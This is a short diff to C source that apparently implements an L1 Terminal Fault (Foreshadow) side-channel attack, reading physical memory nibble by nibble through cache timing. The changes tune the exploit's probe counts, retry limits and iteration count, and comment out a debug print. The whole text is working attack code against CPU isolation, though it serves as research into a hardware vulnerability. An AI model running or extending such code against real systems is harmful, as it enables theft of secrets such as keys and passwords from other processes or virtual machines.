@@ -431,7 +431,7 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
 
 size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer,
                                       void (*l1tf_leak_function)(void *, reload_buffer_t)) {
-  const size_t nr_of_probes = 1000;
+  const size_t nr_of_probes = 25;
   const size_t probe_size = AMOUNT_OF_OPTIONS_IN_NIBBLE * sizeof(size_t);
   size_t *probes = malloc(probe_size);
   memset(probes, 0, probe_size);
@@ -444,7 +444,7 @@ size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_b
       l1tf_leak_function(leak_addr, reload_buffer[0]);
       nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
       attempt += 1;
-    } while (nibble == -1 && attempt < 100);
+    } while (nibble == -1 && attempt < 250);
 
     if (nibble != -1) {
       probes[nibble] += 1;
@@ -487,7 +487,7 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
-  for (int iter = 1; iter <= 1000; ++iter) {
+  for (int iter = 1; iter <= 10000; ++iter) {
     // while (true) {
     for (size_t i = 0, j = start; j < start + length; j += 1) {
       void *leak_addr = (char *)leak.leak + j;
@@ -497,7 +497,7 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
       results[i++] = result;
     }
 
-    printf("Leaked from %p (%d):\t", (void *)phys_addr, iter);
+    //printf("Leaked from %p (%d):\t", (void *)phys_addr, iter);
     for (size_t i = 0; i < length; ++i) {
       printf("%02x ", results[i]);
     }
